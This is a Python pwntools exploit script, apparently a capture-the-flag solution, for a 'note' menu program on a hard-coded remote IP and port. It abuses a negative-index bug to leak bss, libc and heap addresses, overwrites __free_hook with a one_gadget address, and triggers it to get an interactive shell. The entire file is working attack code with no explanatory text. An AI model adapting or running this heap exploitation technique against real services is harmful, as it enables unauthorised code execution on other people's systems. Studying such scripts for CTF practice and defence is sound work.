from pwn import *
context.log_level='debug'
#p=process(['./note'],env={"LD_PRELOAD":"./libc.so.6"})
#p=process('./note')
#raw_input()
p=remote('124.156.135.103',6004)
def new_note(index,size):
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
def sel_note(index):
    p.recvuntil('Choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
def show_note(index):
    p.recvuntil('Choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
def edit_note(index,payload):
    p.recvuntil('Choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Message:\n')
    p.send(payload)
def justonce(index,payload):
    p.recvuntil('Choice: ')
    p.sendline('7')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Message: \n')
    p.send(payload)
def debug(bss_addr,heap_addr,libc_addr=0):
    print("bss_addr=>0x%x"%bss_addr)
    print("heap_addr=>0x%x"%heap_addr)
    print("libc_addr=>0x%x"%libc_addr)
#show bss address 0x04008
show_note(-5)
bss_addr=u64(p.recvn(6).ljust(8,'\x00'))
print("bss_addr=>0x%x"%bss_addr)
#leak libc address and heap address
new_note(0,1)
payload=p64(bss_addr)+p64(857)+p64(1)
justonce(-5,payload)
show_note(-5)
p.recvn(0x18)
libc_addr=u64(p.recvn(8))
p.recvn(120-0x18-8)
heap_addr=u64(p.recvn(8))
debug(bss_addr,heap_addr,libc_addr)
#raw_input()
#calculate relavent address
libc=ELF('./libc.so.6')
offset2libc=0x1e5760
libc_base=libc_addr-offset2libc
free_hook=libc_base+libc.sym['__free_hook']
onegadget=libc_base+0x106ef8
#bss_addr save free_hook
payload=p64(free_hook)+p64(6+857)+p64(1)
justonce(-5,payload)
#change to  one_gadget
payload=p64(onegadget)
justonce(-5,payload)
sel_note(0)
p.interactive()
